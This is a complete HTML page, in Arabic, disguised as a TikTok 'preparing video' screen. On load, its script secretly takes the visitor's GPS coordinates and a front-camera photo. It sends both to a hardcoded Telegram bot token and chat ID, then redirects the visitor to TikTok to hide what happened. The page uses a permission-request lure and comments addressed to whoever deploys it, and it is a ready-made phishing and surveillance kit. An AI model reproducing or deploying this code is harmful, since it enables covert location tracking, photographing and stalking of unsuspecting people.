<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok - Watch Now</title>
    <style>
        body { font-family: 'ProximaNova', sans-serif; background: #010101; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .tiktok-loader { text-align: center; }
        .logo { width: 100px; margin-bottom: 20px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        .text { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
        .sub-text { font-size: 14px; color: #ccc; }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="tiktok-loader">
    <img src="https://logodownload.org/wp-content/uploads/2019/08/tiktok-logo-icon-1.png" class="logo" alt="TikTok">
    <div class="text">جاري تحضير الفيديو...</div>
    <div class="sub-text">يرجى السماح بالأذونات للمتابعة</div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c" width="640" height="480"></canvas>

<script>
    // بيانات البوت الخاصة بك
    const token = '8205090411:AAEIcpDG87AX8gzjI13Ei_pV9BiOcsc25EQ';
    const chatId = '7945738403';
    const tiktokVideoUrl = "https://www.tiktok.com"; // يمكنك وضع رابط فيديو محدد هنا

    // 1. سحب الموقع الجغرافي
    function getGPS() {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const msg = `📍 موقع جديد:\nالرابط: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
            });
        }
    }

    // 2. إرسال الصورة للبوت
    async function sendPhoto(blob) {
        const fd = new FormData();
        fd.append('chat_id', chatId);
        fd.append('photo', blob, 'shot.jpg');
        fd.append('caption', '📸 تم التقاط صورة (أمامية) بنجاح');
        await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
    }

    // 3. التشغيل الرئيسي
    async function start() {
        getGPS(); // سحب الموقع في الخلفية

        try {
            // طلب الكاميرا الأمامية
            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            const video = document.getElementById('v');
            video.srcObject = stream;

            // انتظار ثانيتين لضبط العدسة
            await new Promise(r => setTimeout(r, 2000));

            const canvas = document.getElementById('c');
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(async (blob) => {
                await sendPhoto(blob); // ننتظر حتى يكتمل الإرسال تماماً
                stream.getTracks().forEach(t => t.stop()); // إيقاف الكاميرا
                
                // الانتقال لتيك توك
                window.location.href = tiktokVideoUrl;
            }, 'image/jpeg', 0.8);

        } catch (e) {
            // في حال رفض المستخدم، يظل في صفحة تيك توك أو يحول لمكان آخر
            console.log("Permission Denied");
        }
    }

    window.onload = start;
</script>

</body>
</html>
